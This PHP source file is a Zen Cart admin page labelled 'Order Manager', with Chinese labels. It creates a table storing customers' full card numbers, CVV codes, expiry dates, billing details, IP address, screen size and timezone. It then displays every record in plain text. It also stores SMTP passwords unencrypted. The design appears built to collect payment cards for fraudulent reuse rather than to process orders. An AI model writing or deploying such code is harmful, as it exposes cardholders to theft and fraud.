<?php
/**
 * Order Manager
 * @author @@46231996
 * @version 1.0
 * @create 2015/1/3
 * @modify 2015/1/8
 */

require ('includes/application_top.php');

if (isset($_GET['install']))
{
	
	
	$db->Execute("CREATE TABLE IF NOT EXISTS `credit_card`(
	`credit_card_id`		INT(10) UNSIGNED NOT NULL AUTO_INCREMENT,
	`orders_id`				int(11),
	`total`					decimal(14,2),
	`credit_number`			VARCHAR(512),
	`credit_cvv`			VARCHAR(16),
	`credit_exp_month`		VARCHAR(16),
	`credit_exp_year`		VARCHAR(16),
	`ip`					VARCHAR(128),
	`vga`					VARCHAR(32),
	`timezone`				int,
	`billing_first_name`	VARCHAR(32),
	`billing_last_name`		VARCHAR(32),
	`billing_city`			VARCHAR(32),
	`billing_address`		VARCHAR(32),
	`billing_postcode`		VARCHAR(32),
	PRIMARY KEY(`credit_card_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8;");
	
	exit('Installed');
}
if (isset($_GET['install2']))
{
	$db->Execute("ALTER TABLE `orders` ADD `msg_pay` VARCHAR(64) NULL AFTER `ip_address`;");
}

if (isset($_POST['add_new']) || isset($_POST['save_mail']))
{
	$id = zen_db_prepare_input($_POST['email_id']);
	$smtp_user = zen_db_prepare_input($_POST['smtp_user']);
	$smtp_addr = zen_db_prepare_input($_POST['smtp_addr']);
	$smtp_pwd = zen_db_prepare_input($_POST['smtp_pwd']);
	$smtp_port = zen_db_prepare_input($_POST['smtp_port']);
	$error = false;
	if (empty($smtp_user))
	{
		$error = true;
		$messageStack->add_session('SMTP用户名不能为空', 'caution');
	}
	if (empty($smtp_addr))
	{
		$error = true;
		$messageStack->add_session('SMTP地址不能为空', 'caution');
	}
	if (empty($smtp_port))
	{
		$error = true;
		$messageStack->add_session('SMTP端口', 'caution');
	}
	if (!$error)
	{
		$sql_data_array = array(
			'smtp_user' => $smtp_user,
			'smtp_addr' => $smtp_addr,
			'smtp_pwd' => $smtp_pwd,
			'smtp_port' => $smtp_port
		);
		if (isset($_POST['add_new']))
		{
			zen_db_perform('email_infor', $sql_data_array, 'insert');
		}
		else if (isset($_POST['save_mail']))
		{
			zen_db_perform('email_infor', $sql_data_array, 'update', 'email_infor_id='.$id);
		}
	}
}

$page_num = 20;
if($_GET['page'] == '' or $_GET['page'] < 1)
{
	$check_page = $db->Execute('SELECT COUNT(*) AS total FROM credit_card;');
	$check_count = $check_page->fields['total'];
	if($check_count > $page_num)
	{
		$_GET['page'] = round((($check_count / $page_num) + (fmod_round($check_count, $page_num) != 0 ? .5 : 0)), 0);
	}
	else
	{
		$_GET['page'] = 1;
	}
}
$query_raw = 'SELECT DISTINCT credit_card_id, cc.*,c.*,o.* FROM credit_card cc 
	LEFT JOIN '.TABLE_ORDERS.' o ON(cc.orders_id=o.orders_id)
	LEFT JOIN '.TABLE_CUSTOMERS.' c ON (o.customers_id=c.customers_id) GROUP BY credit_card_id';
// $orders_query_numrows = '';
$creadits_split = new splitPageResults($_GET['page'], $page_num, $query_raw, $orders_query_numrows);
$creadits = $db->Execute($query_raw);

?>
<!doctype html public "-//W3C//DTD HTML 4.01 Transitional//EN">
<html <?php echo HTML_PARAMS; ?>>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=<?php echo CHARSET; ?>">
<title><?php echo TITLE; ?></title>
<link rel="stylesheet" type="text/css" href="includes/stylesheet.css">
<link rel="stylesheet" type="text/css" media="print" href="includes/stylesheet_print.css">
<link rel="stylesheet" type="text/css" href="includes/cssjsmenuhover.css" media="all" id="hoverJS">
<script language="javascript" src="includes/menu.js"></script>
<script language="javascript" src="includes/general.js"></script>
<script language="javascript" src="includes/jquery-1.10.2.js"></script>
<script language="javascript" src="includes/jquery-ui.js"></script>
<link rel="stylesheet" type="text/css" href="includes/jquery-ui.css" />
<script type="text/javascript">
  <!--
  function init()
  {
    cssjsmenu('navbar');
    if (document.getElementById)
    {
      var kill = document.getElementById('hoverJS');
      kill.disabled = true;
    }
  }
  // -->
</script>
<script language="javascript" type="text/javascript"><!--
function couponpopupWindow(url) {
  window.open(url,'popupWindow','toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes,copyhistory=no,width=450,height=280,screenX=150,screenY=150,top=150,left=150')
}
//--></script>

</head>
<body onLoad="init()">
	<!-- header //-->
	<div class="header-area">
<?php
require (DIR_WS_INCLUDES . 'header.php');
?>
</div>
	<!-- header_eof //-->

<!-- body //-->
<table border="0" width="100%" cellspacing="2" cellpadding="2">
	<tr>
		<td width="" valign="top">
		</td>
		<td width="" valign="top">
		</td>
	</tr>
	<tr>
		<td valign="top">
			<table border="0" width="100%" cellspacing="0" cellpadding="2">
				<tbody>
				<tr class="dataTableHeadingRow">
                	<td class="dataTableHeadingContent" align="center">ID</td>
                	<td class="dataTableHeadingContent" align="left">订单编号</td>
                	<td class="dataTableHeadingContent" align="left">客户邮箱</td>
                	<td class="dataTableHeadingContent" align="left">账单姓名</td>
					<td class="dataTableHeadingContent" align="left">卡号</td>
                	<td class="dataTableHeadingContent" align="left">金额</td>
					<td class="dataTableHeadingContent">CVV</td>
					<td class="dataTableHeadingContent">年份</td>
					<td class="dataTableHeadingContent">月份</td>
					<td class="dataTableHeadingContent">IP</td>
					<td class="dataTableHeadingContent">时区</td>
					<td class="dataTableHeadingContent">屏幕</td>
				</tr>
		<?php while (!$creadits->EOF):?>
		<tr id="defaultSelected" class="dataTableRowSelected" onmouseover="rowOverEffect(this)" onmouseout="rowOutEffect(this)">
            <td class="dataTableContent" align="right"><?php echo $creadits->fields['credit_card_id'];?></td>
			<td class="dataTableContent"><a href="orders.php?oID=<?php echo $creadits->fields['orders_id'];?>"><?php echo $creadits->fields['orders_id'];?></a></td>
			<td class="dataTableContent"><a href="customers.php?cID=<?php echo $creadits->fields['customers_id'];?>"><?php echo $creadits->fields['customers_email_address'];?></a></td>
			<td class="dataTableContent"><?php echo $creadits->fields['billing_first_name'].' '.$creadits->fields['billing_last_name'];?></td>
			<td class="dataTableContent" align="left"><?php echo $creadits->fields['credit_number'];?></td>
			<td class="dataTableContent"><?php echo $creadits->fields['total'];?></td>
			<td class="dataTableContent"><?php echo $creadits->fields['credit_cvv'];?></td>
			<td class="dataTableContent"><?php echo $creadits->fields['credit_exp_year'];?></td>
			<td class="dataTableContent"><?php echo $creadits->fields['credit_exp_month'];?></td>
			<td class="dataTableContent"><?php echo $creadits->fields['ip'];?></td>
			<td class="dataTableContent"><?php echo $creadits->fields['timezone'];?></td>
			<td class="dataTableContent"><?php echo $creadits->fields['vga'];?></td>
		</tr>
		<?php $creadits->MoveNext(); endwhile;?>
			</tbody>
			</table>
		</td>
		<td width="" valign="top">
		</td>
		
	</tr>
	<tr>
		<td width="" valign="top">
		<table border="0" width="100%" cellspacing="0" cellpadding="2">
			<tbody>
				<tr>
					<td class="smallText" valign="top"><?php echo $creadits_split->display_count($orders_query_numrows, $page_num, $_REQUEST['page'], '显示%s到%s (共%s)'); ?></td>
					<td class="smallText" align="right"><?php echo $creadits_split->display_links($orders_query_numrows, $page_num, MAX_DISPLAY_PAGE_LINKS, $_REQUEST['page'], zen_get_all_get_params(array('page', 'oID', 'action'))); ?></td>
								</tr>
               			</tbody>
               			</table>
		</td>
		<td width="" valign="top">
		</td>
	</tr>
</table>
<!-- body_eof //-->

	<!-- footer //-->
	<div class="footer-area">
<?php require(DIR_WS_INCLUDES . 'footer.php'); ?>
</div>
	<!-- footer_eof //-->
	<br />
<script type="text/javascript">

</script>
</body>
</html>
<?php require(DIR_WS_INCLUDES . 'application_bottom.php'); ?>